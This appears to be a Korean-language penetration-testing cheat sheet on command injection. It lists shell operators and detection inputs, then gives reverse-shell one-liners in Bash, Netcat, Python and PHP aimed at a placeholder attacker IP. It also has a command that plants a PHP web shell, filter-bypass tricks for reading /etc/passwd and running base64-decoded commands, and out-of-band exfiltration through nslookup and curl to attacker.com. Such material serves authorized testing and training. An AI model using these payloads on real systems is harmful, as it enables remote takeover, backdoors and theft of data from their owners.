---
sidebar_position: 1
title: Command Injection
---

# Command Injection 취약점 진단

## Overview

**Command Injection**: 웹 애플리케이션이 사용자 입력을 적절한 필터링 없이 시스템 쉘(OS 명령어)로 전달하여 악의적인 시스템 명령어가 실행되는 취약점

**주요 발생 원인**:
- `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()` 등의 함수 남용
- 입력값 검증(Validation) 및 이스케이프(Escape) 누락

---

## 1. Reconnaissance (명령어 연산자)

OS 환경에 따라 여러 명령어를 연속으로 실행할 수 있는 메타 문자를 파악

### Linux/Unix 환경
```bash
;       # 순차 실행 (앞 명령어 성공 여부 무관)
&&      # AND 조건 (앞 명령어 성공 시 뒤 명령어 실행)
||      # OR 조건 (앞 명령어 실패 시 뒤 명령어 실행)
|       # 파이프 (앞 명령어의 출력을 뒤 명령어의 입력으로 전달)
&       # 백그라운드 실행
``      # 명령 대체 (백틱 내 명령어 먼저 실행)
$()     # 명령 대체 (소괄호 내 명령어 먼저 실행)
```

### Windows 환경
```cmd
&       # 순차 실행
&&      # AND 조건
||      # OR 조건
|       # 파이프
```

---

## 2. Exploitation

### 기본 탐지 및 정보 수집
입력 폼이나 URL 파라미터에 메타 문자와 함께 정보 수집 명령어 삽입
```bash
# 기본 식별 테스트
; id
&& whoami
| pwd

# URL 인코딩 적용 필수 (Burp Suite: Ctrl+U)
# ; -> %3B, & -> %26, | -> %7C, 공백 -> %20 또는 +
%3B%20id

# Blind (시간 기반) 탐지
; sleep 10                  # Linux
&& ping -c 10 127.0.0.1     # Linux
&& timeout 10               # Windows
```

### 리버스 쉘 (Reverse Shell) 연결
서버에서 공격자의 리스너(Listener)로 쉘 접속을 유도

```bash
# 1. 공격자 환경 리스너 실행
nc -lvnp 4444

# 2. 취약점에 삽입할 페이로드 (택 1)
# [Bash]
; bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

# [Netcat]
; nc -e /bin/sh <attacker-ip> 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <attacker-ip> 4444 >/tmp/f

# [Python3]
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# [PHP]
; php -r '$sock=fsockopen("<attacker-ip>",4444);exec("sh <&3 >&3 2>&3");'
```

### 웹 쉘(Web Shell) 생성
웹 루트 경로(`/var/www/html/` 등) 쓰기 권한이 있을 경우 웹 쉘 파일 업로드
```bash
# PHP 웹 쉘 생성 및 권한 부여
; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php && chmod 777 /var/www/html/shell.php
```

---

## 3. Advanced Techniques

### 필터링 우회 (Bypass) 기법
웹 방화벽(WAF)이나 블랙리스트 필터링을 우회하여 명령을 실행

```bash
# 1. 공백 우회
command1;{tab}command2
command1;${IFS}command2
{cat,/etc/passwd}

# 2. 명령어 난독화 및 문자열 조합
w"h"o"a"m"i"
a=who;b=ami;$a$b
c''at /etc/passwd
ca\t /etc/passwd

# 3. Base64 인코딩 페이로드 실행
# echo "whoami" | base64 -> d2hvYW1pCg==
echo d2hvYW1pCg== | base64 -d | bash
```

### OOB (Out-of-Band) 데이터 탈취
결과가 화면에 표시되지 않는 Blind 환경에서 외부 DNS나 HTTP 요청으로 명령어 결과 유출
```bash
# 외부 DNS 조회에 명령어 결과 포함 (`whoami`.attacker.com)
; nslookup $(whoami).attacker.com

# cURL을 이용한 HTTP 데이터 탈취
; curl http://attacker.com/$(id -u)
```

### 자동화 도구 (Commix)
```bash
# Commix: 커맨드 인젝션 자동 스캔 및 익스플로잇 프레임워크
python3 commix.py --url="http://<target>/page.php?param=value"
```
